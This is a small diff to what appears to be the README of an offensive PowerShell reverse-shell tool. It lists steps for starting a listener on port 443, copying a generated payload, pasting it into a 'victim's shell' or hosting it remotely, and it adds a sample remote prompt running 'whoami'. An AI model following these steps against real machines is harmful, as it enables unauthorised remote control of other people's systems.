@@ -87,6 +87,7 @@ AntiArasaka-Binarie -Name winrm.vbs
 2. aal -i 192.168.1.3 -p 443 #Listener
 3. [+] Payload copied to clipboard! Use Ctrl+V to paste and execute.
 4. Paste your payload into the victim's shell (Consider hosting the shell on a file and requesting it remotely)
+5. [AAK-PShell]:> whoami 
 ```
 
 - - -
